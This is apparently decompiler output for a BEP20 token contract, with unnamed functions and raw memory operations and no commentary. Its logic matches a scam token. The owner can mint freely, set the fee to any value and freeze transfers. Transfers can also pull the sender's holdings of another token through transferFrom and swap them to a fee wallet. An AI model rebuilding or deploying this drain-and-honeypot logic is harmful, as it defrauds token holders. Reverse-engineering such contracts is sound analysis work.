contract main {




// =====================  Runtime code  =====================


address owner;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
uint256 totalSupply;
uint8 decimals;
uint256 F;
array of uint256 symbol;
array of uint256 name;
uint8 stor9;
uint8 stor9; offset 8
uint8 stor9; offset 16
uint256 stor9; offset 16
uint256 stor9; offset 8
address stor10;
uint256 sub_189e5cc2;
uint256 sub_4538aa6c;
uint256 stor14;
uint256 sub_0ac96ee4;
address stor16;
address stor17;
address stor18;

function name() payable {
    return name[0 len name.length]
}

function sub_0ac96ee4(?) payable {
    return sub_0ac96ee4
}

function getF() payable {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    return F
}

function totalSupply() payable {
    return totalSupply
}

function sub_189e5cc2(?) payable {
    return sub_189e5cc2
}

function decimals() payable {
    return decimals
}

function sub_4538aa6c(?) payable {
    return sub_4538aa6c
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function getOwner() payable {
    return owner
}

function owner() payable {
    return owner
}

function symbol() payable {
    return symbol[0 len symbol.length]
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function sub_0aede85b(?) payable {
    if not uint8(stor9.field_0):
        uint8(stor9.field_0) = 1
    else:
        uint8(stor9.field_0) = 0
}

function sub_874faf7f(?) payable {
    if not uint8(stor9.field_8):
        Mask(248, 0, stor9.field_8) = 1
    else:
        Mask(248, 0, stor9.field_8) = 0
}

function sub_c140afc1(?) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    F = arg1
}

function renounceOwnership() payable {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    emit OwnershipTransferred(owner, 0);
    owner = 0
}

function sub_1c9fe2a4(?) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    sub_189e5cc2 = arg1
}

function sub_91c678b1(?) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    sub_4538aa6c = arg1
}

function sub_066c68fd(?) payable {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if not uint8(stor9.field_16):
        Mask(240, 0, stor9.field_16) = 1
    else:
        Mask(240, 0, stor9.field_16) = 0
}

function mint(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if not msg.sender:
        revert with 0, 'BEP20: mint to the zero address'
    totalSupply += arg1
    balanceOf[address(msg.sender)] += arg1
    emit Transfer(arg1, 0, msg.sender);
    return 1
}

function swapExactTokensForTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) payable {
    require calldata.size - 4 >= 160
    require arg3 <= 4294967296
    require arg3 + 36 <= calldata.size
    require arg3.length <= 4294967296 and arg3 + (32 * arg3.length) + 36 <= calldata.size
    mem[160 len 1024] = 32, mem[160 len 992]
    return 32, 32, mem[160 len 1024]
}

function transferOwnership(address arg1) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    38,
                    0x734f776e61626c653a206e6577206f776e657220697320746865207a65726f20616464726573,
                    mem[202 len 26]
    emit OwnershipTransferred(owner, arg1);
    owner = arg1
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7342455032303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7342455032303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function increaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7342455032303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7342455032303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] += arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] + arg2), msg.sender, arg1);
    return 1
}

function decreaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7342455032303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7342455032303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] -= arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] - arg2), msg.sender, arg1);
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require not uint8(stor9.field_0)
    if not uint8(stor9.field_16):
        if not msg.sender:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        37,
                        0xfe42455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                        mem[201 len 27]
        if not arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        35,
                        0x7342455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                        mem[199 len 29]
        balanceOf[address(msg.sender)] -= arg2
        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 / 100 * F)
        balanceOf[stor10] += arg2 / 100 * F
        stor14 = block.timestamp
        sub_0ac96ee4++
        emit Transfer((arg2 / 100 * F), msg.sender, stor10);
    else:
        if block.timestamp - stor14 <= 24 * 3600:
            if sub_0ac96ee4 >= sub_189e5cc2:
                revert with 0, 'Daily limit reached.'
        if sub_0ac96ee4 == sub_189e5cc2:
            sub_0ac96ee4 = 0
        if arg2 > sub_4538aa6c:
            revert with 0, 'Amount limit exceeded'
        if not msg.sender:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        37,
                        0xfe42455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                        mem[201 len 27]
        if not arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        35,
                        0x7342455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                        mem[199 len 29]
        balanceOf[address(msg.sender)] = balanceOf[address(msg.sender)] - arg2 + (arg2 / 100 * F)
        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 / 100 * F)
        balanceOf[stor10] += arg2 / 100 * F
        stor14 = block.timestamp
        sub_0ac96ee4++
        require ext_code.size(stor17)
        call stor17.0x23b872dd with:
             gas gas_remaining wei
            args msg.sender, address(this.address), arg2 / 100 * F
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        mem[160] = stor18
        require ext_code.size(stor17)
        call stor17.approve(address arg1, uint256 arg2) with:
             gas gas_remaining wei
            args stor16, arg2 / 100 * F
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        mem[192] = 0x38ed173900000000000000000000000000000000000000000000000000000000
        mem[196] = arg2 / 100 * F
        mem[228] = 0
        mem[292] = stor10
        mem[324] = block.timestamp
        mem[260] = 160
        mem[356] = 2
        mem[388 len 0] = None
        require ext_code.size(stor16)
        call stor16.0x38ed1739 with:
             gas gas_remaining wei
            args arg2 / 100 * F, 0, 160, stor10, block.timestamp, 2, mem[388 len 64]
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        mem[192 len return_data.size] = ext_call.return_data[0 len return_data.size]
        mem[64] = ceil32(return_data.size) + 192
        require return_data.size >= 32
        require mem[192 len 4], Mask(224, 32, arg2 / 100 * F) >> 32 <= 4294967296
        require mem[192 len 4], Mask(224, 32, arg2 / 100 * F) >> 32 + 32 <= return_data.size
        require mem[mem[192 len 4], Mask(224, 32, arg2 / 100 * F) >> 32 + 192] <= 4294967296 and mem[192 len 4], Mask(224, 32, arg2 / 100 * F) >> 32 + (32 * mem[mem[192 len 4], Mask(224, 32, arg2 / 100 * F) >> 32 + 192]) + 32 <= return_data.size
    emit Transfer((arg2 - (arg2 / 100 * F)), msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    require not uint8(stor9.field_8)
    if not uint8(stor9.field_16):
        if not arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        37,
                        0xfe42455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                        mem[201 len 27]
        if not arg2:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        35,
                        0x7342455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                        mem[199 len 29]
        balanceOf[address(arg1)] -= arg3
        balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 / 100 * F)
        balanceOf[stor10] += arg3 / 100 * F
        stor14 = block.timestamp
        sub_0ac96ee4++
        emit Transfer((arg3 / 100 * F), arg1, stor10);
        emit Transfer((arg3 - (arg3 / 100 * F)), arg1, arg2);
        if not arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        36,
                        0x7342455032303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                        mem[200 len 28]
        if not msg.sender:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        34,
                        0x7342455032303a20617070726f766520746f20746865207a65726f20616464726573,
                        mem[198 len 30]
    else:
        if block.timestamp - stor14 > 24 * 3600:
            if sub_0ac96ee4 != sub_189e5cc2:
                if arg3 > sub_4538aa6c:
                    revert with 0, 'Amount limit exceeded'
                if not arg1:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                37,
                                0xfe42455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                                mem[201 len 27]
                if not arg2:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                35,
                                0x7342455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                                mem[199 len 29]
                balanceOf[address(arg1)] = balanceOf[address(arg1)] - arg3 + (arg3 / 100 * F)
                balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 / 100 * F)
                balanceOf[stor10] += arg3 / 100 * F
                stor14 = block.timestamp
                sub_0ac96ee4++
                require ext_code.size(stor17)
                call stor17.0x23b872dd with:
                     gas gas_remaining wei
                    args msg.sender, address(this.address), arg3 / 100 * F
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                mem[160] = stor18
                require ext_code.size(stor17)
                call stor17.approve(address arg1, uint256 arg2) with:
                     gas gas_remaining wei
                    args stor16, arg3 / 100 * F
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                mem[192] = 0x38ed173900000000000000000000000000000000000000000000000000000000
                mem[196] = arg3 / 100 * F
                mem[228] = 0
                mem[292] = stor10
                mem[324] = block.timestamp
                mem[260] = 160
                mem[356] = 2
                mem[388 len 0] = None
                require ext_code.size(stor16)
                call stor16.0x38ed1739 with:
                     gas gas_remaining wei
                    args arg3 / 100 * F, 0, 160, stor10, block.timestamp, 2, mem[388 len 64]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                mem[192 len return_data.size] = ext_call.return_data[0 len return_data.size]
                mem[64] = ceil32(return_data.size) + 192
                require return_data.size >= 32
                _233 = mem[192 len 4], Mask(224, 32, arg3 / 100 * F) >> 32
                require mem[192 len 4], Mask(224, 32, arg3 / 100 * F) >> 32 <= 4294967296
                require mem[192 len 4], Mask(224, 32, arg3 / 100 * F) >> 32 + 32 <= return_data.size
                require mem[mem[192 len 4], Mask(224, 32, arg3 / 100 * F) >> 32 + 192] <= 4294967296 and mem[192 len 4], Mask(224, 32, arg3 / 100 * F) >> 32 + (32 * mem[mem[192 len 4], Mask(224, 32, arg3 / 100 * F) >> 32 + 192]) + 32 <= return_data.size
                mem[ceil32(return_data.size) + 192] = mem[mem[192 len 4], Mask(224, 32, arg3 / 100 * F) >> 32 + 192]
                _245 = mem[_233 + 192]
                mem[ceil32(return_data.size) + 224 len floor32(mem[_233 + 192])] = mem[_233 + 224 len floor32(mem[_233 + 192])]
                emit Transfer((arg3 - (arg3 / 100 * F)), arg1, arg2);
                if not arg1:
                    revert with 0, 
                                32,
                                36,
                                0x7342455032303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                                mem[(32 * _245) + ceil32(return_data.size) + 328 len 28]
                if not msg.sender:
                    revert with 0, 
                                32,
                                34,
                                0x7342455032303a20617070726f766520746f20746865207a65726f20616464726573,
                                mem[(32 * _245) + ceil32(return_data.size) + 326 len 30]
            else:
                sub_0ac96ee4 = 0
                if arg3 > sub_4538aa6c:
                    revert with 0, 'Amount limit exceeded'
                if not arg1:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                37,
                                0xfe42455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                                mem[201 len 27]
                if not arg2:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                35,
                                0x7342455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                                mem[199 len 29]
                balanceOf[address(arg1)] = balanceOf[address(arg1)] - arg3 + (arg3 / 100 * F)
                balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 / 100 * F)
                balanceOf[stor10] += arg3 / 100 * F
                stor14 = block.timestamp
                sub_0ac96ee4++
                require ext_code.size(stor17)
                call stor17.0x23b872dd with:
                     gas gas_remaining wei
                    args msg.sender, address(this.address), arg3 / 100 * F
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                mem[160] = stor18
                require ext_code.size(stor17)
                call stor17.approve(address arg1, uint256 arg2) with:
                     gas gas_remaining wei
                    args stor16, arg3 / 100 * F
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                mem[192] = 0x38ed173900000000000000000000000000000000000000000000000000000000
                mem[196] = arg3 / 100 * F
                mem[228] = 0
                mem[292] = stor10
                mem[324] = block.timestamp
                mem[260] = 160
                mem[356] = 2
                mem[388 len 0] = None
                require ext_code.size(stor16)
                call stor16.0x38ed1739 with:
                     gas gas_remaining wei
                    args arg3 / 100 * F, 0, 160, stor10, block.timestamp, 2, mem[388 len 64]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                mem[192 len return_data.size] = ext_call.return_data[0 len return_data.size]
                mem[64] = ceil32(return_data.size) + 192
                require return_data.size >= 32
                _235 = mem[192 len 4], Mask(224, 32, arg3 / 100 * F) >> 32
                require mem[192 len 4], Mask(224, 32, arg3 / 100 * F) >> 32 <= 4294967296
                require mem[192 len 4], Mask(224, 32, arg3 / 100 * F) >> 32 + 32 <= return_data.size
                require mem[mem[192 len 4], Mask(224, 32, arg3 / 100 * F) >> 32 + 192] <= 4294967296 and mem[192 len 4], Mask(224, 32, arg3 / 100 * F) >> 32 + (32 * mem[mem[192 len 4], Mask(224, 32, arg3 / 100 * F) >> 32 + 192]) + 32 <= return_data.size
                mem[ceil32(return_data.size) + 192] = mem[mem[192 len 4], Mask(224, 32, arg3 / 100 * F) >> 32 + 192]
                _246 = mem[_235 + 192]
                mem[ceil32(return_data.size) + 224 len floor32(mem[_235 + 192])] = mem[_235 + 224 len floor32(mem[_235 + 192])]
                emit Transfer((arg3 - (arg3 / 100 * F)), arg1, arg2);
                if not arg1:
                    revert with 0, 
                                32,
                                36,
                                0x7342455032303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                                mem[(32 * _246) + ceil32(return_data.size) + 328 len 28]
                if not msg.sender:
                    revert with 0, 
                                32,
                                34,
                                0x7342455032303a20617070726f766520746f20746865207a65726f20616464726573,
                                mem[(32 * _246) + ceil32(return_data.size) + 326 len 30]
        else:
            if sub_0ac96ee4 >= sub_189e5cc2:
                revert with 0, 'Daily limit reached.'
            if sub_0ac96ee4 != sub_189e5cc2:
                if arg3 > sub_4538aa6c:
                    revert with 0, 'Amount limit exceeded'
                if not arg1:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                37,
                                0xfe42455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                                mem[201 len 27]
                if not arg2:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                35,
                                0x7342455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                                mem[199 len 29]
                balanceOf[address(arg1)] = balanceOf[address(arg1)] - arg3 + (arg3 / 100 * F)
                balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 / 100 * F)
                balanceOf[stor10] += arg3 / 100 * F
                stor14 = block.timestamp
                sub_0ac96ee4++
                require ext_code.size(stor17)
                call stor17.0x23b872dd with:
                     gas gas_remaining wei
                    args msg.sender, address(this.address), arg3 / 100 * F
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                mem[160] = stor18
                require ext_code.size(stor17)
                call stor17.approve(address arg1, uint256 arg2) with:
                     gas gas_remaining wei
                    args stor16, arg3 / 100 * F
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                mem[192] = 0x38ed173900000000000000000000000000000000000000000000000000000000
                mem[196] = arg3 / 100 * F
                mem[228] = 0
                mem[292] = stor10
                mem[324] = block.timestamp
                mem[260] = 160
                mem[356] = 2
                mem[388 len 0] = None
                require ext_code.size(stor16)
                call stor16.0x38ed1739 with:
                     gas gas_remaining wei
                    args arg3 / 100 * F, 0, 160, stor10, block.timestamp, 2, mem[388 len 64]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                mem[192 len return_data.size] = ext_call.return_data[0 len return_data.size]
                mem[64] = ceil32(return_data.size) + 192
                require return_data.size >= 32
                _237 = mem[192 len 4], Mask(224, 32, arg3 / 100 * F) >> 32
                require mem[192 len 4], Mask(224, 32, arg3 / 100 * F) >> 32 <= 4294967296
                require mem[192 len 4], Mask(224, 32, arg3 / 100 * F) >> 32 + 32 <= return_data.size
                require mem[mem[192 len 4], Mask(224, 32, arg3 / 100 * F) >> 32 + 192] <= 4294967296 and mem[192 len 4], Mask(224, 32, arg3 / 100 * F) >> 32 + (32 * mem[mem[192 len 4], Mask(224, 32, arg3 / 100 * F) >> 32 + 192]) + 32 <= return_data.size
                mem[ceil32(return_data.size) + 192] = mem[mem[192 len 4], Mask(224, 32, arg3 / 100 * F) >> 32 + 192]
                _247 = mem[_237 + 192]
                mem[ceil32(return_data.size) + 224 len floor32(mem[_237 + 192])] = mem[_237 + 224 len floor32(mem[_237 + 192])]
                emit Transfer((arg3 - (arg3 / 100 * F)), arg1, arg2);
                if not arg1:
                    revert with 0, 
                                32,
                                36,
                                0x7342455032303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                                mem[(32 * _247) + ceil32(return_data.size) + 328 len 28]
                if not msg.sender:
                    revert with 0, 
                                32,
                                34,
                                0x7342455032303a20617070726f766520746f20746865207a65726f20616464726573,
                                mem[(32 * _247) + ceil32(return_data.size) + 326 len 30]
            else:
                sub_0ac96ee4 = 0
                if arg3 > sub_4538aa6c:
                    revert with 0, 'Amount limit exceeded'
                if not arg1:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                37,
                                0xfe42455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                                mem[201 len 27]
                if not arg2:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                35,
                                0x7342455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                                mem[199 len 29]
                balanceOf[address(arg1)] = balanceOf[address(arg1)] - arg3 + (arg3 / 100 * F)
                balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 / 100 * F)
                balanceOf[stor10] += arg3 / 100 * F
                stor14 = block.timestamp
                sub_0ac96ee4++
                require ext_code.size(stor17)
                call stor17.0x23b872dd with:
                     gas gas_remaining wei
                    args msg.sender, address(this.address), arg3 / 100 * F
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                mem[160] = stor18
                require ext_code.size(stor17)
                call stor17.approve(address arg1, uint256 arg2) with:
                     gas gas_remaining wei
                    args stor16, arg3 / 100 * F
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                mem[192] = 0x38ed173900000000000000000000000000000000000000000000000000000000
                mem[196] = arg3 / 100 * F
                mem[228] = 0
                mem[292] = stor10
                mem[324] = block.timestamp
                mem[260] = 160
                mem[356] = 2
                mem[388 len 0] = None
                require ext_code.size(stor16)
                call stor16.0x38ed1739 with:
                     gas gas_remaining wei
                    args arg3 / 100 * F, 0, 160, stor10, block.timestamp, 2, mem[388 len 64]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                mem[192 len return_data.size] = ext_call.return_data[0 len return_data.size]
                mem[64] = ceil32(return_data.size) + 192
                require return_data.size >= 32
                _239 = mem[192 len 4], Mask(224, 32, arg3 / 100 * F) >> 32
                require mem[192 len 4], Mask(224, 32, arg3 / 100 * F) >> 32 <= 4294967296
                require mem[192 len 4], Mask(224, 32, arg3 / 100 * F) >> 32 + 32 <= return_data.size
                require mem[mem[192 len 4], Mask(224, 32, arg3 / 100 * F) >> 32 + 192] <= 4294967296 and mem[192 len 4], Mask(224, 32, arg3 / 100 * F) >> 32 + (32 * mem[mem[192 len 4], Mask(224, 32, arg3 / 100 * F) >> 32 + 192]) + 32 <= return_data.size
                mem[ceil32(return_data.size) + 192] = mem[mem[192 len 4], Mask(224, 32, arg3 / 100 * F) >> 32 + 192]
                _248 = mem[_239 + 192]
                mem[ceil32(return_data.size) + 224 len floor32(mem[_239 + 192])] = mem[_239 + 224 len floor32(mem[_239 + 192])]
                emit Transfer((arg3 - (arg3 / 100 * F)), arg1, arg2);
                if not arg1:
                    revert with 0, 
                                32,
                                36,
                                0x7342455032303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                                mem[(32 * _248) + ceil32(return_data.size) + 328 len 28]
                if not msg.sender:
                    revert with 0, 
                                32,
                                34,
                                0x7342455032303a20617070726f766520746f20746865207a65726f20616464726573,
                                mem[(32 * _248) + ceil32(return_data.size) + 326 len 30]
    ('bool', 'msg.sender')
    allowance[address(arg1)][address(msg.sender)] -= arg3
    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    return 1
}



}
